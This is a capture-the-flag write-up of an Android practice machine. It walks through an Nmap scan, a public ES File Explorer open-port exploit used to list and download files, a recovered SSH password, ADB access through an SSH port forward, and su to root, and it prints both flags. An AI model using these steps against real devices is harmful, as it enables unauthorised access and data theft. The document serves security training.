![image](https://user-images.githubusercontent.com/105310322/187552925-ecf9301c-a189-4093-bf8f-b67086c10e3c.png)

### Tools: Nmap, ssh, adb

### Vulnerabilities: ADB, Saved Credentials, ES File Explorer

Nmap gives a couple of open ports. Port 5555 seemed very interesting and turns out it is a game based on the civilization series. Port 5555 also happens to be a debugging port for android, but trying to connect via adb was not giving me anything.

The next port 42135 for ES file explorer is also interesting.

```console
└──╼ [★]$ sudo nmap -p- -sS -sC -sV 10.129.50.183
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-30 20:23 BST
Nmap scan report for 10.129.50.183
Host is up (0.076s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp  filtered freeciv
33293/tcp open     unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 30 Aug 2022 19:25:16 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Tue, 30 Aug 2022 19:25:16 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Tue, 30 Aug 2022 19:25:21 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 30 Aug 2022 19:25:36 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 30 Aug 2022 19:25:21 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 30 Aug 2022 19:25:36 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 30 Aug 2022 19:25:36 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 30 Aug 2022 19:25:36 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
42135/tcp open     http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.92%I=7%D=8/30%Time=630E641C%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port33293-TCP:V=7.92%I=7%D=8/30%Time=630E641B%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x20
SF:30\x20Aug\x202022\x2019:25:16\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Tue,\x2030\x20Aug\x202022\x2019:2
SF:5:16\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Tue,\x2030\x20Aug\x202022\x
SF:2019:25:21\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Tue,\x2030\x20Aug\x202022\x2019:25:21\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Tue,\x2030\x20Aug\x202022\x2019:25:36\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq
SF:,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x2030\x20Aug\x
SF:202022\x2019:25:36\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSe
SF:rverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x203
SF:0\x20Aug\x202022\x2019:25:36\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Tue,\x2030\x20Aug\x202022\x2019:25:36\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 187.50 seconds
```

A quick google search gives a simple exploit for ES file explorer.

https://github.com/fs0c131y/ESFileExplorerOpenPortVuln

Running it we can see a bunch of files but I was unable to go deeper than the starting directory.

```console
└──╼ [★]$ python3 poc.py --cmd listFiles --host 10.129.50.183
[*] Executing command: listFiles on 10.129.50.183
[*] Server responded with: 200
[
{"name":"lib", "time":"3/25/20 05:12:02 AM", "type":"folder", "size":"12.00 KB (12,288 Bytes)", }, 
{"name":"vndservice_contexts", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"65.00 Bytes (65 Bytes)", }, 
{"name":"vendor_service_contexts", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_seapp_contexts", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_property_contexts", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"392.00 Bytes (392 Bytes)", }, 
{"name":"vendor_hwservice_contexts", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_file_contexts", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"6.92 KB (7,081 Bytes)", }, 
{"name":"vendor", "time":"3/25/20 12:12:33 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"ueventd.rc", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"5.00 KB (5,122 Bytes)", }, 
{"name":"ueventd.android_x86_64.rc", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"464.00 Bytes (464 Bytes)", }, 
{"name":"system", "time":"3/25/20 12:12:31 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"sys", "time":"8/30/22 02:42:46 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"storage", "time":"8/30/22 02:42:50 PM", "type":"folder", "size":"80.00 Bytes (80 Bytes)", }, 
{"name":"sepolicy", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"357.18 KB (365,756 Bytes)", }, 
{"name":"sdcard", "time":"4/21/21 02:12:29 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"sbin", "time":"8/30/22 02:42:46 PM", "type":"folder", "size":"140.00 Bytes (140 Bytes)", }, 
{"name":"product", "time":"3/24/20 11:39:17 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"proc", "time":"8/30/22 02:42:45 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"plat_service_contexts", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"13.73 KB (14,057 Bytes)", }, 
{"name":"plat_seapp_contexts", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"1.28 KB (1,315 Bytes)", }, 
{"name":"plat_property_contexts", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"6.53 KB (6,687 Bytes)", }, 
{"name":"plat_hwservice_contexts", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"7.04 KB (7,212 Bytes)", }, 
{"name":"plat_file_contexts", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"23.30 KB (23,863 Bytes)", }, 
{"name":"oem", "time":"8/30/22 02:42:46 PM", "type":"folder", "size":"40.00 Bytes (40 Bytes)", }, 
{"name":"odm", "time":"8/30/22 02:42:46 PM", "type":"folder", "size":"220.00 Bytes (220 Bytes)", }, 
{"name":"mnt", "time":"8/30/22 02:42:47 PM", "type":"folder", "size":"240.00 Bytes (240 Bytes)", }, 
{"name":"init.zygote64_32.rc", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"875.00 Bytes (875 Bytes)", }, 
{"name":"init.zygote32.rc", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"511.00 Bytes (511 Bytes)", }, 
{"name":"init.usb.rc", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"5.51 KB (5,646 Bytes)", }, 
{"name":"init.usb.configfs.rc", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"7.51 KB (7,690 Bytes)", }, 
{"name":"init.superuser.rc", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"582.00 Bytes (582 Bytes)", }, 
{"name":"init.rc", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"29.00 KB (29,697 Bytes)", }, 
{"name":"init.environ.rc", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"1.04 KB (1,064 Bytes)", }, 
{"name":"init.android_x86_64.rc", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"3.36 KB (3,439 Bytes)", }, 
{"name":"init", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"2.29 MB (2,401,264 Bytes)", }, 
{"name":"fstab.android_x86_64", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"753.00 Bytes (753 Bytes)", }, 
{"name":"etc", "time":"3/25/20 03:41:52 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"dev", "time":"8/30/22 02:42:48 PM", "type":"folder", "size":"2.64 KB (2,700 Bytes)", }, 
{"name":"default.prop", "time":"8/30/22 02:42:46 PM", "type":"file", "size":"1.09 KB (1,118 Bytes)", }, 
{"name":"data", "time":"3/15/21 04:49:09 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"d", "time":"8/30/22 02:42:45 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"config", "time":"8/30/22 02:42:47 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"charger", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"cache", "time":"8/30/22 02:42:47 PM", "type":"folder", "size":"120.00 Bytes (120 Bytes)", }, 
{"name":"bugreports", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"bin", "time":"3/25/20 12:26:22 AM", "type":"folder", "size":"8.00 KB (8,192 Bytes)", }, 
{"name":"acct", "time":"8/30/22 02:42:46 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }
]
```
However by using the listPics command there is 1 that sticks out.

creds.jpg

```console
└──╼ [★]$ python3 poc.py --cmd listPics --host 10.129.50.183
[*] Executing command: listPics on 10.129.50.183
[*] Server responded with: 200

{"name":"concept.jpg", "time":"4/21/21 02:38:08 AM", "location":"/storage/emulated/0/DCIM/concept.jpg", "size":"135.33 KB (138,573 Bytes)", },
{"name":"anc.png", "time":"4/21/21 02:37:50 AM", "location":"/storage/emulated/0/DCIM/anc.png", "size":"6.24 KB (6,392 Bytes)", },
{"name":"creds.jpg", "time":"4/21/21 02:38:18 AM", "location":"/storage/emulated/0/DCIM/creds.jpg", "size":"1.14 MB (1,200,401 Bytes)", },
{"name":"224_anc.png", "time":"4/21/21 02:37:21 AM", "location":"/storage/emulated/0/DCIM/224_anc.png", "size":"124.88 KB (127,876 Bytes)"}
```
Get the file with our exploit.

```console
└──╼ [★]$ python3 poc.py -g /storage/emulated/0/DCIM/creds.jpg --host 10.129.50.183
[*] Getting file: /storage/emulated/0/DCIM/creds.jpg
	from: 10.129.50.183
[*] Server responded with: 200
[*] Writing to file: creds.jpg
```
Nice we get some credentials for Kristi.

Note: All of the commands for how to use the exploit are on the github page linked above.

![image](https://user-images.githubusercontent.com/105310322/187546075-5fa48056-3f25-4ff8-b990-1925ad3e2572.png)


Input the Strong Password ```Kr1sT!5h@Rp3xPl0r3!``` and we are in!

```console
└──╼ [★]$ ssh -p 2222 kristi@10.129.50.183
Password authentication
Password: 
:/ $
```
I was getting denied when trying to view but diving a little deeper let us in to cat the user flag.

Note: This flag is also found in /sdcard and there were no issues viewing it there.

```console
:/storage $ ls /storage/emulated/                                              
ls: /storage/emulated/: Permission denied
1|:/storage $ ls /storage/emulated/0                                           
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt 
Android Download Music  Pictures      Ringtones dianxinos 
1|:/storage $ cat /storage/emulated/0/user.txt                                 
f32017174c7c7e8f50c6da52891ae250
:/storage $ 
```
With this being my first android machine I tried a few different methods similar to linux boxes, but I was not getting anywhere.

Then I remembered how I tried to use adb to connect to port 5555 and debug.

This time instead of using a simple ``adb connect 10.129.50.183:5555```

I am going to have Kristi set it up and then connect via my host computer.

```console
└──╼ [★]$ ssh -p 2222 -L 5555:localhost:5555 kristi@10.129.50.183
Password authentication
Password: 
:/ $ 
```
Now that Kristi is connected lets run adb again.

```console
└──╼ [★]$ adb connect localhost:5555
connected to localhost:5555
```
Now that we are connected just open a shell and we are in! But we are not root yet.

```console
└──╼ [★]$ adb shell               
x86_64:/ $ id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
x86_64:/ $
```
Simply using the command ```su``` does the trick and we are finally root.

```console
1|x86_64:/ $ su               
:/ #

:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
:/ # 
```
Navigate to the /data folder and cat the flag!

```console
:/ # cat data/root.txt
f04fc82b6d49b41c9b08982be59338c5
:/ # 
```

Pretty cool doing an Android machine for the first time. Only a little different from linux and felt familiar going through phone directories.

Congrats!
